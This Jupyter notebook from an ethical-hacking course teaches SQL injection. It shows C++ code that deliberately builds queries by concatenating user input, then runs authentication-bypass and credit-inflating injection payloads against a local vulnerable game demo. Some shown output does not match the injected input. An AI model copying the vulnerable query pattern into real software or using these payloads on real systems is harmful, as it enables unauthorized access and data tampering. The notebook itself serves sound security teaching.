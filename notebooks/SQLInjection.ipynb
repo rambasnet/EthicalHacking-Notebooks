{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SQL Injection Attack\n",
    "\n",
    "- Details - [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)\n",
    "- attack consists of insertion or \"injection\" of a SQL query via the input data from the client to the application\n",
    "- a successful attack violates all three principles of CIA (Confidentialiy, Integrity and Availablity) and more\n",
    "\n",
    "## Consequences\n",
    "- the main consequences are:\n",
    "\n",
    "### Confidentiality\n",
    "- exploit can read unauthorized sensitive data violating confidentiality of the data\n",
    "    \n",
    "### Integrity\n",
    "- exploit can alter unauthrized sensitive data violating integrity of the data\n",
    "\n",
    "### Availability\n",
    "- exploit can delete data by dropping table or the whole database viloating availability of the data\n",
    "\n",
    "### Authentication\n",
    "- exploit allows an attacker to authenticate to a vulnerable application as someone else without the knowledge of password\n",
    "\n",
    "### Authorization\n",
    "- if access control and authrizaton information is held on the SQL database, it can be modified as well e.g., allowing a regular user all the priviledges of an administrative user\n",
    "\n",
    "## Risk Factors\n",
    "- the platform affected ared:\n",
    "    - Language: SQL - Structured query language\n",
    "    - Platform: Any that interacts with a SQL database\n",
    "- SQL injection has become a common issue with SQL-based web applications\n",
    "- the flaw can be easily deteced and exploited as well as mitigated\n",
    "\n",
    "## Programming Flaw\n",
    "- developers simply trust the user input and concatenates the user input as part of the SQL query that's sent to the database engine\n",
    "- the flaw is not specific to any programming language API used to connect to the SQL database; but affects all the languages if not done correctly!\n",
    "- attack is accomplished by placing/injecting a meta character into data input thus fooling the application to execute the injected SQL and forcing the application to do things that was not intended by the developers\n",
    "\n",
    "## Examples\n",
    "- the following example demonstrates C++ language interaction with the SQL database"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "#include <string>\n",
    "#include <iostream>\n",
    "\n",
    "using namespace std;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "string username, password, sql;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "enter username: user\n"
     ]
    }
   ],
   "source": [
    "cout << \"enter username: \";\n",
    "cin >> username;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "enter password: user\n"
     ]
    }
   ],
   "source": [
    "cout << \"enter password: \";\n",
    "cin >> password;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql = \"select uid, username, password from account where username='\"+username+\"' and password='\"+password+\"'\";"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"select uid, username, password from account where username='user' and password='user'\""
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### what if the attackers provided\n",
    "- username: yada' or 1=1' --\n",
    "- password: who cares?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "enter username: yada' or 1=1; --\n"
     ]
    }
   ],
   "source": [
    "cout << \"enter username: \";\n",
    "getline(cin, username);"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "enter password: who cares?\n"
     ]
    }
   ],
   "source": [
    "cout << \"enter password: \";\n",
    "getline(cin, password);"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql = \"select uid, username, password from account where username='\"+username+\"' and password='\"+password+\"'\";"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"select uid, username, password from account where username='yada' or 1=1; --' and password='who cares?'\""
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## SQL Injection Demos\n",
    "- see demos/SQL/injection folder\n",
    "- injection project is the redesign of lucky7 game using SQLite database\n",
    "- use `Makefile` to compile the game\n",
    "- game must be root setuid as it creates and stores `lucky7.db` file in `var` folder\n",
    "- when the game is executed it sets up the database with default account `admin:P@$sw0rd!`\n",
    "- players can register and play luck7 games\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ cd demos/SQL/injection \n",
    "\n",
    "┌──(kali㉿K)-[~/EthicalHacking/demos/SQL/injection]\n",
    "└─$ sudo make  \n",
    "\n",
    "┌──(kali㉿K)-[~/EthicalHacking/demos/SQL/injection]\n",
    "└─$ sudo chmod +s lucky7.exe\n",
    "\n",
    "┌──(kali㉿K)-[~/EthicalHacking/demos/SQL/injection]\n",
    "└─$ ls -al lucky7.exe       \n",
    "-rwsr-sr-x 1 root root 391664 Dec 27 14:11 lucky7.exe\n",
    "\n",
    "\n",
    "```\n",
    "\n",
    "- run the game and follow the menu option\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/demos/SQL/injection]\n",
    "└─$ ./lucky7.exe\n",
    "Database opened successfully...\n",
    "SQL: CREATE TABLE IF NOT EXISTS Account ( uid TEXT, username TEXT, password TEXT, role TEXT, UNIQUE (username), PRIMARY KEY (uid));\n",
    "SQL: CREATE TABLE IF NOT EXISTS Player (uid TEXT, credits INTEGER, name TEXT, PRIMARY KEY (uid) );\n",
    "SQL: INSERT INTO Account (uid, username, password, role) VALUES ('fbb16eb2-eff2-49a9-b063-2d06a462c5b3', 'admin', 'P@$sw0rd!', 'admin');\n",
    "SQL error: UNIQUE constraint failed: Account.username...\n",
    "Database setup complete...\n",
    "========================================\n",
    "-=[ Main Menu Options ]=-\n",
    "1 - Login \n",
    "2 - Register New Player\n",
    "3 - Exit\n",
    "\n",
    "Enter your choice [1-3]: 2\n",
    "-=-={ New Player Registration }=-=-\n",
    "Username: user\n",
    "Password: user\n",
    "Full name: user user\n",
    "SQL: INSERT INTO Account (uid, username, password, role) VALUES ( '41122bf6-2231-4338-ac94-15d5eb8fc591', 'user', 'user', 'user');\n",
    "SQL: INSERT INTO Player (uid, credits, name) VALUES ('41122bf6-2231-4338-ac94-15d5eb8fc591', '500', 'user user');\n",
    "Registration successful!\n",
    "Login to start playing...\n",
    "========================================\n",
    "-=[ Main Menu Options ]=-\n",
    "1 - Login \n",
    "2 - Register New Player\n",
    "3 - Exit\n",
    "Enter your choice [1-3]: \n",
    "```\n",
    "- login and play game\n",
    "\n",
    "```bash\n",
    "Enter your choice [1-3]: 1\n",
    "Username: user\n",
    "Password: user\n",
    "SQL: SELECT uid, password, role from Account WHERE username = 'user' and password = 'user';\n",
    "SQL: SELECT credits, name from Player WHERE uid = '41122bf6-2231-4338-ac94-15d5eb8fc591';\n",
    "=================================================\n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Logout\n",
    "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n",
    "[Name: user user]\n",
    "[You have 500 credits]\n",
    "=================================================\n",
    "Enter your choice [1-7]: 1\n",
    "\n",
    "~*~*~ Lucky 7 ~*~*~\n",
    "Costs 10 credits to play this game.\n",
    "Machine will generate 1 random numbers each between 1 and 9.\n",
    "If the number is 7, you win a jackpot of 10 THOUSAND\n",
    "Otherwise, you lose.\n",
    "\n",
    "\n",
    "[DEBUG] current_game pointer 0x00404d23\n",
    "the random number is: 2 \n",
    "Sorry! Better luck next time...\n",
    "\n",
    "You have 490 credits\n",
    "Would you like to play again? [y/n]: n\n",
    "SQL: UPDATE Player set name = 'user user', credits = 490 WHERE uid = '41122bf6-2231-4338-ac94-15d5eb8fc591';\n",
    "=================================================\n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change name\n",
    "6 - Reset account at 500 credits\n",
    "7 - Logout\n",
    "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n",
    "[Name: user user]\n",
    "[You have 490 credits]\n",
    "=================================================\n",
    "Enter your choice [1-7]: 7\n",
    "SQL: UPDATE Player set name = 'user user', credits = 490 WHERE uid = '41122bf6-2231-4338-ac94-15d5eb8fc591';\n",
    "========================================\n",
    "-=[ Main Menu Options ]=-\n",
    "1 - Login \n",
    "2 - Register New Player\n",
    "3 - Exit\n",
    "Enter your choice [1-3]: \n",
    "```\n",
    "\n",
    "- Login as built-in admin account\n",
    "\n",
    "```bash\n",
    "Enter your choice [1-3]: 1\n",
    "Username: admin\n",
    "Password: P@$sw0rd!\n",
    "SQL: SELECT uid, password, role from Account WHERE username = 'admin' and password = 'P@$sw0rd!';\n",
    "SQL: SELECT credits, name from Player WHERE uid = '38db4ccb-eb09-4296-93d2-be49d10e9c8d';\n",
    "\n",
    "            ~*~*~*~* User Account Details ~*~*~*\n",
    "Username            Password            Role      Full name           Credits   \n",
    "--------------------------------------------------------------------------------\n",
    "admin               P@$sw0rd!           admin     Admin Admin         0         \n",
    "jsmith              password            user      John Smith          400       \n",
    "user                user                user      user user           490       \n",
    "********************************************************************************\n",
    "========================================\n",
    "-=[ Main Menu Options ]=-\n",
    "1 - Login \n",
    "2 - Register New Player\n",
    "3 - Exit\n",
    "Enter your choice [1-3]: \n",
    "```\n",
    "\n",
    "### SQL Injection\n",
    "- login as admin without providing password\n",
    "\n",
    "```bash\n",
    "Enter your choice [1-3]: 1\n",
    "Username: yada' or 1=1;--\n",
    "Password: asdf\n",
    "SQL: SELECT uid, password, role from Account WHERE username = 'yada' or 1=1;--' and password = 'asdf';\n",
    "SQL: SELECT credits, name from Player WHERE uid = '38db4ccb-eb09-4296-93d2-be49d10e9c8d';\n",
    "\n",
    "            ~*~*~*~* User Account Details ~*~*~*\n",
    "Username            Password            Role      Full name           Credits   \n",
    "--------------------------------------------------------------------------------\n",
    "admin               P@$sw0rd!           admin     Admin Admin         0         \n",
    "jsmith              password            user      John Smith          400       \n",
    "user                user                user      user user           490       \n",
    "********************************************************************************\n",
    "========================================\n",
    "-=[ Main Menu Options ]=-\n",
    "1 - Login \n",
    "2 - Register New Player\n",
    "3 - Exit\n",
    "Enter your choice [1-3]: \n",
    "```\n",
    "\n",
    "### Hit Jackput - increase your credits by 1M\n",
    "\n",
    "```\n",
    "Enter your choice [1-7]: 5\n",
    "\n",
    "Change user name\n",
    "Enter your new name:\n",
    "User User', credits=credits+1000000 where uid='41122bf6-2231-4338-ac94-15d5eb8fc591'; --\n",
    "SQL: UPDATE Player set name = 'User User', credits=credits+1000000 where uid='41122bf6-2231-4338-ac94-15d5eb8fc591'; --' WHERE uid = '41122bf6-2231-4338-ac94-15d5eb8fc591';\n",
    "==================================================\n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change name\n",
    "6 - Reset account at 500 credits\n",
    "7 - Logout\n",
    "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n",
    "[Name: User User'; update Player set credits=credits+1000000 where uid='41122bf6-2231-4338-ac94-15d5eb8fc591'; --]\n",
    "[You have 200490 credits]\n",
    "==================================================\n",
    "Enter your choice [1-7]: \n",
    "```\n",
    "\n",
    "- View your total credits with option 4\n",
    "- Or logout and log back in to see the new credits"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "C++14",
   "language": "C++14",
   "name": "xcpp14"
  },
  "language_info": {
   "codemirror_mode": "text/x-c++src",
   "file_extension": ".cpp",
   "mimetype": "text/x-c++src",
   "name": "c++",
   "version": "14"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
